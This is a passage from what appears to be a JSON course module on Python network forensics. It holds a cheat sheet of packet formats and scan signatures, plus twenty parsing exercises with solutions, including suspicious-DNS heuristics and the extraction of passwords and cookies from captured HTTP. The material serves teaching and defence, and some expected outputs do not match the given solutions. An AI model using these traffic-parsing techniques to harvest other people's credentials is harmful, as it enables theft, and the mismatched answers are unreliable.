└─────────────────────────────────────────────────────┘\n</pre>\n</div>\n\n<div style=\"background: #1a1a2e; padding: 20px; border-radius: 12px; margin: 15px 0;\">\n<h3 style=\"color: #2ecc71;\">🔧 struct.unpack Format Codes</h3>\n<pre style=\"color: #ecf0f1;\">\n  <span style=\"color: #e74c3c;\">!</span>  = Network byte order (big-endian) — <span style=\"color: #2ecc71;\">ALWAYS use for packets</span>\n  <span style=\"color: #3498db;\">B</span>  = unsigned byte (1B)      <span style=\"color: #3498db;\">H</span>  = unsigned short (2B)\n  <span style=\"color: #3498db;\">I</span>  = unsigned int (4B)       <span style=\"color: #3498db;\">s</span>  = bytes (e.g. 6s = 6 bytes)\n\n  <span style=\"color: #f39c12;\">Ethernet:</span> struct.unpack('!6s6sH', data[:14])\n             dst_mac(6) + src_mac(6) + type(2) = <span style=\"color: #2ecc71;\">14 bytes</span>\n\n  <span style=\"color: #f39c12;\">IPv4:</span>     data[0]>>4 = version, (data[0]&0xF)*4 = header_len\n             data[8]=TTL, data[9]=proto\n             socket.inet_ntoa(data[12:16]) = src IP\n             socket.inet_ntoa(data[16:20]) = dst IP\n\n  <span style=\"color: #f39c12;\">TCP:</span>      struct.unpack('!HH', data[:4]) = src_port, dst_port\n             struct.unpack('!I', data[4:8]) = seq_number\n             data[13] = flags byte\n\n  <span style=\"color: #f39c12;\">UDP:</span>      struct.unpack('!HHHH', data[:8])\n             src_port + dst_port + length + checksum = <span style=\"color: #2ecc71;\">8 bytes</span>\n</pre>\n</div>\n\n<div style=\"background: #1a1a2e; padding: 20px; border-radius: 12px; margin: 15px 0;\">\n<h3 style=\"color: #f39c12;\">🚩 TCP Flags Reference</h3>\n<pre style=\"color: #ecf0f1;\">\n  Bit   Flag    Meaning                  Attack Relevance\n  ───   ────    ───────                  ────────────────\n  0x01  <span style=\"color: #2ecc71;\">FIN</span>     Finish connection          FIN scan (stealth)\n  0x02  <span style=\"color: #e74c3c;\">SYN</span>     Synchronise (start)        SYN scan, SYN flood\n  0x04  <span style=\"color: #e74c3c;\">RST</span>     Reset (abort)              RST attack, port closed\n  0x08  <span style=\"color: #3498db;\">PSH</span>     Push (send immediately)    Data transfer\n  0x10  <span style=\"color: #2ecc71;\">ACK</span>     Acknowledge                Normal traffic\n  0x20  <span style=\"color: #f39c12;\">URG</span>     Urgent                     Rare, evasion\n\n  <span style=\"color: #e74c3c;\">Common Combinations:</span>\n  SYN         = New connection request\n  SYN|ACK     = Connection accepted\n  ACK         = Data transfer / acknowledgement\n  FIN|ACK     = Graceful close\n  RST         = Connection refused / aborted\n  PSH|ACK     = Data push\n\n  <span style=\"color: #e74c3c;\">Attack Signatures:</span>\n  SYN only (mass)     = Port scan or SYN flood\n  FIN only            = Stealth FIN scan\n  No flags (NULL)     = NULL scan\n  FIN|PSH|URG (Xmas)  = Christmas tree scan\n</pre>\n</div>\n\n<div style=\"background: #1a1a2e; padding: 20px; border-radius: 12px; margin: 15px 0;\">\n<h3 style=\"color: #e74c3c;\">🔍 Common Ports & Services</h3>\n<pre style=\"color: #ecf0f1;\">\n  Port    Service       Protocol   Notes\n  ────    ───────       ────────   ─────\n  20/21   <span style=\"color: #e74c3c;\">FTP</span>           TCP        File transfer (cleartext!)\n  22      <span style=\"color: #2ecc71;\">SSH</span>           TCP        Secure shell (encrypted)\n  23      <span style=\"color: #e74c3c;\">Telnet</span>        TCP        Remote login (cleartext!)\n  25      <span style=\"color: #f39c12;\">SMTP</span>          TCP        Email sending\n  53      <span style=\"color: #3498db;\">DNS</span>           UDP/TCP    Domain resolution\n  80      <span style=\"color: #f39c12;\">HTTP</span>          TCP        Web (cleartext)\n  110     <span style=\"color: #f39c12;\">POP3</span>          TCP        Email retrieval\n  143     <span style=\"color: #f39c12;\">IMAP</span>          TCP        Email access\n  443     <span style=\"color: #2ecc71;\">HTTPS</span>         TCP        Secure web (encrypted)\n  445     <span style=\"color: #e74c3c;\">SMB</span>           TCP        File sharing (attack target)\n  3306    <span style=\"color: #9b59b6;\">MySQL</span>         TCP        Database\n  3389    <span style=\"color: #e74c3c;\">RDP</span>           TCP        Remote desktop (attack target)\n  5432    <span style=\"color: #9b59b6;\">PostgreSQL</span>    TCP        Database\n  8080    <span style=\"color: #f39c12;\">HTTP-Alt</span>      TCP        Web proxy/alternative\n</pre>\n</div>\n\n<div style=\"background: #1a1a2e; padding: 20px; border-radius: 12px; margin: 15px 0;\">\n<h3 style=\"color: #9b59b6;\">🔬 Analysis Workflow</h3>\n<pre style=\"color: #ecf0f1;\">\n  <span style=\"background: #e74c3c; color: white; padding: 3px 10px; border-radius: 4px;\">1. CAPTURE</span>  Collect packets (tcpdump, Wireshark, Python socket)\n     │\n     ▼\n  <span style=\"background: #3498db; color: white; padding: 3px 10px; border-radius: 4px;\">2. PARSE</span>    Decode headers layer by layer\n     │        Ethernet → IP → TCP/UDP → Application\n     ▼\n  <span style=\"background: #2ecc71; color: white; padding: 3px 10px; border-radius: 4px;\">3. FLOWS</span>    Group packets into conversations (5-tuple)\n     │        src_ip + dst_ip + src_port + dst_port + protocol\n     ▼\n  <span style=\"background: #f39c12; color: white; padding: 3px 10px; border-radius: 4px;\">4. DETECT</span>   Apply signatures and statistical analysis\n     │        Port scans, floods, brute-force, anomalies\n     ▼\n  <span style=\"background: #9b59b6; color: white; padding: 3px 10px; border-radius: 4px;\">5. REPORT</span>   Generate forensic report with evidence\n</pre>\n</div>\n\n<div style=\"background: #0d3b0d; padding: 15px; border-radius: 12px; margin: 15px 0; border: 2px solid #2ecc71;\">\n<h3 style=\"color: #2ecc71;\">🏆 10 Golden Rules of Network Forensics</h3>\n<pre style=\"color: #ecf0f1;\">\n  1. Always use <span style=\"color: #e74c3c;\">!</span> (big-endian) for struct.unpack on network data\n  2. Ethernet = 14 bytes, IP = 20+ bytes, TCP = 20+ bytes, UDP = 8 bytes\n  3. IP protocol field: 1=ICMP, 6=TCP, 17=UDP\n  4. TCP flags tell the story: SYN/ACK/FIN/RST/PSH\n  5. Many SYNs without ACKs = attack (scan or flood)\n  6. Many connections to one port from one IP = brute-force\n  7. DNS reveals every site a host contacts\n  8. HTTP POST in cleartext exposes credentials\n  9. Statistical anomalies catch attacks without signatures\n  10. Always preserve original captures — work on copies!\n</pre>\n</div>\n</div>"
+      },
+      "practice_exercises": [
+        {
+          "exercise_id": "ex_01",
+          "title": "Exercise 1: Parse Ethernet Header",
+          "description": "Extract destination MAC, source MAC, and EtherType from a 14-byte Ethernet header.",
+          "difficulty": "beginner",
+          "category": "Packet Parsing Basics",
+          "estimated_minutes": 3,
+          "ai_intro": "Let us work on parse ethernet header! This is a beginner exercise in Packet Parsing Basics.",
+          "starter_code": "import struct\ndef parse_eth(frame):\n    # TODO: Unpack 6s6sH from first 14 bytes\n    # Print dst MAC, src MAC, EtherType\n    pass\n\nframe = b'\\x11\\x22\\x33\\x44\\x55\\x66\\xAA\\xBB\\xCC\\xDD\\xEE\\xFF\\x08\\x00' + b'\\x00'*20\nparse_eth(frame)",
+          "expected_output": "Dst: 11:22:33:44:55:66\nSrc: aa:bb:cc:dd:ee:ff\nType: 0x0800 (IPv4)",
+          "hints": [
+            {
+              "message": "Use struct.unpack('!6s6sH', frame[:14]) for dest MAC, src MAC, EtherType."
+            },
+            {
+              "message": "Format MAC bytes as ':'.join(f'{b:02x}' for b in mac_bytes)."
+            },
+            {
+              "message": "import struct\ndef parse_eth(frame):\n    d,s,t = struct.unpack('!6s6sH', frame[:14])\n    print(f'Dst: {\":\".join(f\"{b:02x}\" for b in d)}')\n    print(f'Src: {\":\".join(f\"{b:02x}\" for b in s)}')\n    print(f'Type: 0x{t:04X} ({\"IPv4\" if t==0x0800 else \"?\"})')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_02",
+          "title": "Exercise 2: Parse IPv4 Header",
+          "description": "Extract version, TTL, protocol, source and destination IP from an IPv4 header.",
+          "difficulty": "beginner",
+          "category": "Packet Parsing Basics",
+          "estimated_minutes": 3,
+          "ai_intro": "Let us work on parse ipv4 header! This is a beginner exercise in Packet Parsing Basics.",
+          "starter_code": "import struct, socket\ndef parse_ip(data):\n    # TODO: version = data[0]>>4, TTL = data[8], proto = data[9]\n    # src = inet_ntoa(data[12:16]), dst = inet_ntoa(data[16:20])\n    pass\n\nip = b'\\x45\\x00\\x00\\x28\\x00\\x00\\x40\\x00\\x40\\x06\\x00\\x00'\nip += socket.inet_aton('10.0.0.1') + socket.inet_aton('192.168.1.5')\nparse_ip(ip)",
+          "expected_output": "IPv4 TTL=64 Proto=6(TCP) 10.0.0.1->192.168.1.5",
+          "hints": [
+            {
+              "message": "Version is top 4 bits of byte 0: data[0] >> 4. TTL is byte 8."
+            },
+            {
+              "message": "Protocol byte 9: 6=TCP, 17=UDP, 1=ICMP. IPs at bytes 12-15 and 16-19."
+            },
+            {
+              "message": "import socket\ndef parse_ip(data):\n    v=data[0]>>4; ttl=data[8]; pr=data[9]\n    s=socket.inet_ntoa(data[12:16]); d=socket.inet_ntoa(data[16:20])\n    print(f'IPv{v} TTL={ttl} Proto={pr}({{6:\"TCP\",17:\"UDP\",1:\"ICMP\"}}.get(pr,\"?\")) {s}->{d}')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_03",
+          "title": "Exercise 3: Parse TCP Header",
+          "description": "Extract source port, dest port, and decode TCP flags from a header.",
+          "difficulty": "intermediate",
+          "category": "Packet Parsing Basics",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on parse tcp header! This is a intermediate exercise in Packet Parsing Basics.",
+          "starter_code": "import struct\ndef parse_tcp(data):\n    # TODO: Unpack ports from first 4 bytes, flags from byte 13\n    pass\n\ntcp = struct.pack('!HHIIBBHHH', 52431, 80, 1000, 0, 0x50, 0x02, 65535, 0, 0)\nparse_tcp(tcp)",
+          "expected_output": "52431->80 Flags=[SYN]",
+          "hints": [
+            {
+              "message": "Source and dest port: struct.unpack('!HH', data[:4]). Flags in byte 13."
+            },
+            {
+              "message": "SYN=0x02, ACK=0x10, FIN=0x01, RST=0x04, PSH=0x08. Check each with &."
+            },
+            {
+              "message": "import struct\ndef parse_tcp(data):\n    sp,dp = struct.unpack('!HH', data[:4])\n    f = data[13]\n    flags = [n for m,n in [(0x02,'SYN'),(0x10,'ACK'),(0x01,'FIN'),(0x04,'RST'),(0x08,'PSH')] if f&m]\n    print(f'{sp}->{dp} Flags=[{\"|\".join(flags)}]')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_04",
+          "title": "Exercise 4: Parse UDP Header",
+          "description": "Extract all four fields from an 8-byte UDP header.",
+          "difficulty": "beginner",
+          "category": "Packet Parsing Basics",
+          "estimated_minutes": 3,
+          "ai_intro": "Let us work on parse udp header! This is a beginner exercise in Packet Parsing Basics.",
+          "starter_code": "import struct\ndef parse_udp(data):\n    # TODO: Unpack 4 unsigned shorts\n    pass\n\nudp = struct.pack('!HHHH', 54321, 53, 30, 0xABCD) + b'\\x00'*22\nparse_udp(udp)",
+          "expected_output": "UDP 54321->53 Len=30 Checksum=0xABCD",
+          "hints": [
+            {
+              "message": "struct.unpack('!HHHH', data[:8]) gives src_port, dst_port, length, checksum."
+            },
+            {
+              "message": "All four fields are 2-byte unsigned shorts."
+            },
+            {
+              "message": "import struct\ndef parse_udp(data):\n    s,d,l,c = struct.unpack('!HHHH', data[:8])\n    print(f'UDP {s}->{d} Len={l} Checksum=0x{c:04X}')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_05",
+          "title": "Exercise 5: Format MAC Address",
+          "description": "Convert 6 raw bytes into a human-readable MAC address string.",
+          "difficulty": "beginner",
+          "category": "Packet Parsing Basics",
+          "estimated_minutes": 3,
+          "ai_intro": "Let us work on format mac address! This is a beginner exercise in Packet Parsing Basics.",
+          "starter_code": "def format_mac(raw_bytes):\n    # TODO: Convert to 'aa:bb:cc:dd:ee:ff' format\n    pass\n\nprint(format_mac(b'\\xAA\\xBB\\xCC\\xDD\\xEE\\xFF'))\nprint(format_mac(b'\\x00\\x11\\x22\\x33\\x44\\x55'))",
+          "expected_output": "aa:bb:cc:dd:ee:ff\n00:11:22:33:44:55",
+          "hints": [
+            {
+              "message": "Join each byte formatted as 2-digit lowercase hex with colons."
+            },
+            {
+              "message": "':'.join(f'{b:02x}' for b in raw_bytes)"
+            },
+            {
+              "message": "def format_mac(raw_bytes):\n    return ':'.join(f'{b:02x}' for b in raw_bytes)"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_06",
+          "title": "Exercise 6: IP Address to Integer",
+          "description": "Convert dotted IP to integer and back.",
+          "difficulty": "beginner",
+          "category": "Packet Parsing Basics",
+          "estimated_minutes": 3,
+          "ai_intro": "Let us work on ip address to integer! This is a beginner exercise in Packet Parsing Basics.",
+          "starter_code": "import socket, struct\ndef ip_to_int(ip_str):\n    # TODO: Convert '192.168.1.1' to integer\n    pass\ndef int_to_ip(ip_int):\n    # TODO: Convert integer back to dotted string\n    pass\n\nprint(ip_to_int('192.168.1.1'))\nprint(int_to_ip(3232235777))",
+          "expected_output": "3232235777\n192.168.1.1",
+          "hints": [
+            {
+              "message": "socket.inet_aton gives 4 bytes. struct.unpack('!I',...) gives integer."
+            },
+            {
+              "message": "Reverse: struct.pack('!I', ip_int) then socket.inet_ntoa()."
+            },
+            {
+              "message": "import socket, struct\ndef ip_to_int(s): return struct.unpack('!I', socket.inet_aton(s))[0]\ndef int_to_ip(i): return socket.inet_ntoa(struct.pack('!I', i))"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_07",
+          "title": "Exercise 7: Identify Protocol by Number",
+          "description": "Map IP protocol numbers to names.",
+          "difficulty": "beginner",
+          "category": "Packet Parsing Basics",
+          "estimated_minutes": 3,
+          "ai_intro": "Let us work on identify protocol by number! This is a beginner exercise in Packet Parsing Basics.",
+          "starter_code": "def proto_name(num):\n    # TODO: Return protocol name for common numbers\n    pass\n\nfor n in [1, 6, 17, 2, 47, 50, 51, 89]:\n    print(f'{n} = {proto_name(n)}')",
+          "expected_output": "1 = ICMP\n6 = TCP\n17 = UDP\n2 = IGMP\n47 = GRE\n50 = ESP\n51 = AH\n89 = OSPF",
+          "hints": [
+            {
+              "message": "Create a dictionary mapping numbers to names."
+            },
+            {
+              "message": "Common: 1=ICMP, 6=TCP, 17=UDP, 2=IGMP, 47=GRE, 50=ESP, 51=AH, 89=OSPF."
+            },
+            {
+              "message": "def proto_name(n):\n    return {1:'ICMP',2:'IGMP',6:'TCP',17:'UDP',47:'GRE',50:'ESP',51:'AH',89:'OSPF'}.get(n, f'Unknown({n})')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_08",
+          "title": "Exercise 8: Identify Service by Port",
+          "description": "Map port numbers to service names.",
+          "difficulty": "beginner",
+          "category": "Packet Parsing Basics",
+          "estimated_minutes": 3,
+          "ai_intro": "Let us work on identify service by port! This is a beginner exercise in Packet Parsing Basics.",
+          "starter_code": "def port_service(port):\n    # TODO: Return service name\n    pass\n\nfor p in [21, 22, 25, 53, 80, 110, 443, 3306, 3389, 8080]:\n    print(f'{p} = {port_service(p)}')",
+          "expected_output": "21 = FTP\n22 = SSH\n25 = SMTP\n53 = DNS\n80 = HTTP\n110 = POP3\n443 = HTTPS\n3306 = MySQL\n3389 = RDP\n8080 = HTTP-Alt",
+          "hints": [
+            {
+              "message": "Build a dictionary of port->service mappings."
+            },
+            {
+              "message": "Include at least 15 common ports."
+            },
+            {
+              "message": "def port_service(p):\n    return {20:'FTP-Data',21:'FTP',22:'SSH',23:'Telnet',25:'SMTP',53:'DNS',67:'DHCP',80:'HTTP',110:'POP3',143:'IMAP',443:'HTTPS',445:'SMB',993:'IMAPS',3306:'MySQL',3389:'RDP',5432:'PostgreSQL',8080:'HTTP-Alt',8443:'HTTPS-Alt'}.get(p, f'Port {p}')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_09",
+          "title": "Exercise 9: Calculate IP Header Length",
+          "description": "Determine actual header length from the IHL field.",
+          "difficulty": "intermediate",
+          "category": "Packet Parsing Basics",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on calculate ip header length! This is a intermediate exercise in Packet Parsing Basics.",
+          "starter_code": "def ip_header_len(first_byte):\n    # TODO: Extract IHL (low nibble) and multiply by 4\n    pass\n\nfor b in [0x45, 0x46, 0x4F, 0x60]:\n    print(f'Byte 0x{b:02X}: {ip_header_len(b)}')",
+          "expected_output": "Byte 0x45: 20 bytes (version 4)\nByte 0x46: 24 bytes (version 4)\nByte 0x4F: 60 bytes (version 4)\nByte 0x60: 0 bytes (version 6)",
+          "hints": [
+            {
+              "message": "IHL is the low 4 bits: first_byte & 0x0F. Multiply by 4 for bytes."
+            },
+            {
+              "message": "Version is high 4 bits: first_byte >> 4. IPv4 IHL minimum is 5 (20 bytes)."
+            },
+            {
+              "message": "def ip_header_len(b):\n    v = b >> 4; ihl = (b & 0x0F) * 4\n    print(f'Byte 0x{b:02X}: {ihl} bytes (version {v})')\n    return ihl"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_10",
+          "title": "Exercise 10: Decode TCP Flag Byte",
+          "description": "Given a TCP flags byte, list all active flags.",
+          "difficulty": "intermediate",
+          "category": "Packet Parsing Basics",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on decode tcp flag byte! This is a intermediate exercise in Packet Parsing Basics.",
+          "starter_code": "def decode_flags(byte_val):\n    # TODO: Check each bit and build list of flag names\n    pass\n\nfor fb in [0x02, 0x12, 0x11, 0x04, 0x18, 0x3F]:\n    print(f'0x{fb:02X} = {decode_flags(fb)}')",
+          "expected_output": "0x02 = [SYN]\n0x12 = [SYN, ACK]\n0x11 = [FIN, ACK]\n0x04 = [RST]\n0x18 = [PSH, ACK]\n0x3F = [FIN, SYN, RST, PSH, ACK, URG]",
+          "hints": [
+            {
+              "message": "Check each flag bit: FIN=0x01, SYN=0x02, RST=0x04, PSH=0x08, ACK=0x10, URG=0x20."
+            },
+            {
+              "message": "Use list comprehension with bitwise AND."
+            },
+            {
+              "message": "def decode_flags(b):\n    return [n for m,n in [(0x01,'FIN'),(0x02,'SYN'),(0x04,'RST'),(0x08,'PSH'),(0x10,'ACK'),(0x20,'URG')] if b&m]"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_11",
+          "title": "Exercise 11: Decode DNS Domain Name",
+          "description": "Parse length-prefixed DNS name encoding into dotted format.",
+          "difficulty": "intermediate",
+          "category": "DNS & HTTP Analysis",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on decode dns domain name! This is a intermediate exercise in DNS & HTTP Analysis.",
+          "starter_code": "def decode_dns(data, offset=0):\n    # TODO: Read length-prefixed labels until zero byte\n    pass\n\nprint(decode_dns(b'\\x03www\\x06google\\x03com\\x00'))\nprint(decode_dns(b'\\x04mail\\x05yahoo\\x03com\\x00'))\nprint(decode_dns(b'\\x02uk\\x00'))",
+          "expected_output": "www.google.com\nmail.yahoo.com\nuk",
+          "hints": [
+            {
+              "message": "Read first byte as length, then that many bytes as label. Repeat until length=0."
+            },
+            {
+              "message": "Labels are: length_byte + that_many_ascii_chars. Zero byte terminates."
+            },
+            {
+              "message": "def decode_dns(data, offset=0):\n    labels = []\n    while offset < len(data) and data[offset]:\n        l = data[offset]; offset += 1\n        labels.append(data[offset:offset+l].decode()); offset += l\n    return '.'.join(labels)"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_12",
+          "title": "Exercise 12: Encode DNS Domain Name",
+          "description": "Convert a dotted domain name into DNS wire format.",
+          "difficulty": "intermediate",
+          "category": "DNS & HTTP Analysis",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on encode dns domain name! This is a intermediate exercise in DNS & HTTP Analysis.",
+          "starter_code": "def encode_dns(domain):\n    # TODO: Convert 'www.google.com' to b'\\x03www\\x06google\\x03com\\x00'\n    pass\n\nprint(encode_dns('www.google.com').hex())\nprint(encode_dns('example.org').hex())",
+          "expected_output": "03777777 06676f6f676c65 03636f6d 00\n076578616d706c65 036f7267 00",
+          "hints": [
+            {
+              "message": "Split by '.', prefix each label with its length as a byte, end with \\x00."
+            },
+            {
+              "message": "bytes([len(label)]) + label.encode() for each label."
+            },
+            {
+              "message": "def encode_dns(domain):\n    result = b''\n    for label in domain.split('.'):\n        result += bytes([len(label)]) + label.encode()\n    return result + b'\\x00'"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_13",
+          "title": "Exercise 13: Build DNS Query Packet",
+          "description": "Construct a complete DNS query for an A record.",
+          "difficulty": "intermediate",
+          "category": "DNS & HTTP Analysis",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on build dns query packet! This is a intermediate exercise in DNS & HTTP Analysis.",
+          "starter_code": "import struct\ndef build_dns_query(domain, txid=0x1234):\n    # TODO: Header (12B) + question section\n    pass\n\nq = build_dns_query('www.example.com')\nprint(f'Length: {len(q)} bytes')\nprint(f'Hex: {q[:12].hex(\" \")}')",
+          "expected_output": "Length: 33 bytes\nHex: 12 34 01 00 00 01 00 00 00 00 00 00",
+          "hints": [
+            {
+              "message": "DNS header: TXID(2B) + flags(2B, 0x0100=standard query) + counts (QDCOUNT=1, rest=0)."
+            },
+            {
+              "message": "Question: encoded_name + type(2B, A=1) + class(2B, IN=1)."
+            },
+            {
+              "message": "import struct\ndef build_dns_query(domain, txid=0x1234):\n    header = struct.pack('!HHHHHH', txid, 0x0100, 1, 0, 0, 0)\n    name = b''\n    for label in domain.split('.'): name += bytes([len(label)]) + label.encode()\n    name += b'\\x00'\n    question = name + struct.pack('!HH', 1, 1)\n    return header + question"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_14",
+          "title": "Exercise 14: Parse HTTP Response Status",
+          "description": "Extract status code and reason from an HTTP response line.",
+          "difficulty": "beginner",
+          "category": "DNS & HTTP Analysis",
+          "estimated_minutes": 3,
+          "ai_intro": "Let us work on parse http response status! This is a beginner exercise in DNS & HTTP Analysis.",
+          "starter_code": "def parse_status(response):\n    # TODO: Split first line, extract code and reason\n    pass\n\nfor resp in ['HTTP/1.1 200 OK', 'HTTP/1.1 404 Not Found', 'HTTP/1.1 301 Moved Permanently', 'HTTP/1.1 500 Internal Server Error']:\n    parse_status(resp)",
+          "expected_output": "200 OK\n404 Not Found\n301 Moved Permanently\n500 Internal Server Error",
+          "hints": [
+            {
+              "message": "Split first line by space (maxsplit=2): version, code, reason."
+            },
+            {
+              "message": "int(parts[1]) gives the numeric code."
+            },
+            {
+              "message": "def parse_status(resp):\n    parts = resp.split(' ', 2)\n    print(f'{parts[1]} {parts[2]}' if len(parts)>=3 else resp)"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_15",
+          "title": "Exercise 15: Extract HTTP Headers",
+          "description": "Parse HTTP headers into a dictionary.",
+          "difficulty": "intermediate",
+          "category": "DNS & HTTP Analysis",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on extract http headers! This is a intermediate exercise in DNS & HTTP Analysis.",
+          "starter_code": "def parse_headers(raw):\n    # TODO: Split by \\r\\n, skip first line, parse key: value pairs\n    pass\n\nreq = 'GET / HTTP/1.1\\r\\nHost: example.com\\r\\nUser-Agent: Mozilla/5.0\\r\\nAccept: text/html\\r\\nCookie: session=abc\\r\\n\\r\\n'\nhdrs = parse_headers(req)\nfor k,v in hdrs.items(): print(f'{k}: {v}')",
+          "expected_output": "Host: example.com\nUser-Agent: Mozilla/5.0\nAccept: text/html\nCookie: session=abc",
+          "hints": [
+            {
+              "message": "Split by \\r\\n, skip line 0 (request line), split each remaining line on ':' (maxsplit=1)."
+            },
+            {
+              "message": "Strip whitespace from both key and value."
+            },
+            {
+              "message": "def parse_headers(raw):\n    hdrs = {}\n    for line in raw.split('\\r\\n')[1:]:\n        if ':' in line:\n            k,v = line.split(':',1); hdrs[k.strip()] = v.strip()\n    return hdrs"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_16",
+          "title": "Exercise 16: Extract URLs from HTTP",
+          "description": "Find all URLs in captured HTTP traffic.",
+          "difficulty": "intermediate",
+          "category": "DNS & HTTP Analysis",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on extract urls from http! This is a intermediate exercise in DNS & HTTP Analysis.",
+          "starter_code": "import re\ndef extract_urls(traffic_list):\n    # TODO: Combine Host header and path for each request\n    pass\n\ntraffic = [\n    'GET /index.html HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n',\n    'POST /api/login HTTP/1.1\\r\\nHost: api.service.com\\r\\n\\r\\n',\n    'GET /images/logo.png HTTP/1.1\\r\\nHost: cdn.example.com\\r\\n\\r\\n'\n]\nfor url in extract_urls(traffic): print(url)",
+          "expected_output": "http://example.com/index.html\nhttp://api.service.com/api/login\nhttp://cdn.example.com/images/logo.png",
+          "hints": [
+            {
+              "message": "For each request, extract the path from line 1 and Host header value."
+            },
+            {
+              "message": "Combine as http://host + path."
+            },
+            {
+              "message": "import re\ndef extract_urls(traffic):\n    urls = []\n    for t in traffic:\n        lines = t.split('\\r\\n')\n        path = lines[0].split(' ')[1] if ' ' in lines[0] else '/'\n        host = ''\n        for l in lines[1:]:\n            if l.lower().startswith('host:'): host = l.split(':',1)[1].strip()\n        if host: urls.append(f'http://{host}{path}')\n    return urls"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_17",
+          "title": "Exercise 17: Parse POST Form Data",
+          "description": "Extract key-value pairs from URL-encoded POST body.",
+          "difficulty": "intermediate",
+          "category": "DNS & HTTP Analysis",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on parse post form data! This is a intermediate exercise in DNS & HTTP Analysis.",
+          "starter_code": "def parse_form(body):\n    # TODO: Split by & then by = to get key-value pairs\n    pass\n\nresult = parse_form('username=admin&password=P%40ssw0rd&remember=true')\nfor k,v in result.items(): print(f'{k} = {v}')",
+          "expected_output": "username = admin\npassword = P%40ssw0rd\nremember = true",
+          "hints": [
+            {
+              "message": "Split body by '&' to get pairs, split each pair by '=' to get key and value."
+            },
+            {
+              "message": "Handle URL-encoded characters with urllib.parse.unquote if needed."
+            },
+            {
+              "message": "def parse_form(body):\n    result = {}\n    for pair in body.split('&'):\n        if '=' in pair:\n            k,v = pair.split('=',1); result[k] = v\n    return result"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_18",
+          "title": "Exercise 18: Detect Suspicious DNS Queries",
+          "description": "Flag DNS queries to suspicious domains based on heuristics.",
+          "difficulty": "intermediate",
+          "category": "DNS & HTTP Analysis",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on detect suspicious dns queries! This is a intermediate exercise in DNS & HTTP Analysis.",
+          "starter_code": "import re\ndef check_dns(domain):\n    # TODO: Check for hex subdomains, deep nesting, suspicious TLDs\n    pass\n\nfor d in ['google.com','a1b2c3d4e5f6a7b8.evil.tk','sub1.sub2.sub3.sub4.sub5.c2.ml','normal.org']:\n    check_dns(d)",
+          "expected_output": "google.com: CLEAN\na1b2c3d4e5f6a7b8.evil.tk: SUSPICIOUS [HEX_SUBDOMAIN, BAD_TLD]\nsub1.sub2.sub3.sub4.sub5.c2.ml: SUSPICIOUS [DEEP_NESTING, BAD_TLD]\nnormal.org: CLEAN",
+          "hints": [
+            {
+              "message": "Check: len>50, hex pattern [0-9a-f]{16+}, dot count>4, TLD in suspect list."
+            },
+            {
+              "message": "Suspicious TLDs: tk, ml, ga, cf (free domains popular with malware)."
+            },
+            {
+              "message": "import re\ndef check_dns(d):\n    flags = []\n    if re.search(r'[0-9a-f]{16,}',d): flags.append('HEX_SUBDOMAIN')\n    if d.count('.')>4: flags.append('DEEP_NESTING')\n    if d.split('.')[-1] in ('tk','ml','ga','cf'): flags.append('BAD_TLD')\n    print(f'{d}: {\"SUSPICIOUS [\"+\", \".join(flags)+\"]\" if flags else \"CLEAN\"}')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_19",
+          "title": "Exercise 19: DNS Query Counter",
+          "description": "Count and rank DNS queries by domain.",
+          "difficulty": "beginner",
+          "category": "DNS & HTTP Analysis",
+          "estimated_minutes": 3,
+          "ai_intro": "Let us work on dns query counter! This is a beginner exercise in DNS & HTTP Analysis.",
+          "starter_code": "from collections import Counter\ndef count_dns(queries):\n    # TODO: Count domains and print top 5\n    pass\n\nqueries = ['google.com']*10 + ['github.com']*5 + ['evil.tk']*3 + ['example.com']*8\ncount_dns(queries)",
+          "expected_output": "Top DNS Queries:\n  10 google.com\n   8 example.com\n   5 github.com\n   3 evil.tk",
+          "hints": [
+            {
+              "message": "Use collections.Counter to count domains."
+            },
+            {
+              "message": "Sort by count (most_common) and print."
+            },
+            {
+              "message": "from collections import Counter\ndef count_dns(queries):\n    c = Counter(queries)\n    print('Top DNS Queries:')\n    for d,n in c.most_common(): print(f'  {n:4d} {d}')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_20",
+          "title": "Exercise 20: Extract Cookies from HTTP",
+          "description": "Pull all cookie values from HTTP headers.",
+          "difficulty": "intermediate",
+          "category": "DNS & HTTP Analysis",
+          "estimated_minutes": 5,
+          "ai_intro": "Let us work on extract cookies from http! This is a intermediate exercise in DNS & HTTP Analysis.",
+          "starter_code": "import re\ndef extract_cookies(headers):\n    # TODO: Find Cookie header and parse key=value pairs\n    pass\n\nhdrs = 'GET / HTTP/1.1\\r\\nHost: app.com\\r\\nCookie: session=abc123; user=admin; theme=dark\\r\\n\\r\\n'\nfor k,v in extract_cookies(hdrs).items(): print(f'{k} = {v}')",
+          "expected_output": "session = abc123\nuser = admin\ntheme = dark",
+          "hints": [
+            {
+              "message": "Find the Cookie header line. Split its value by '; ' then by '='."
+            },
+            {
+              "message": "Cookie format: key1=val1; key2=val2; key3=val3"
+            },
+            {
